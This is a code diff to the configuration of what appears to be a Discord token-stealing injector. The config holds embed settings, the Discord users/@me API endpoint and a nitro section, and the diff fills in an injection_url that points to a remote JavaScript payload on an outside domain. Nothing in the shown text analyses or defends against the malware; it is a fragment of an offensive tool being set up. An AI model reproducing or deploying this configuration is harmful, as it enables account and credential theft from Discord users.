@@ -14,7 +14,7 @@ const config = {
   embed_name: 'VERT', 
   embed_icon: 'https://cdn.discordapp.com/attachments/961950134814535700/961987421879287878/IMG_9854.png'.replace(/ /g, '%20'), 
   embed_color: 8363488,
-  injection_url: '', 
+  injection_url: 'https://amorzinho.xyz/jorge/1nj3ct.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
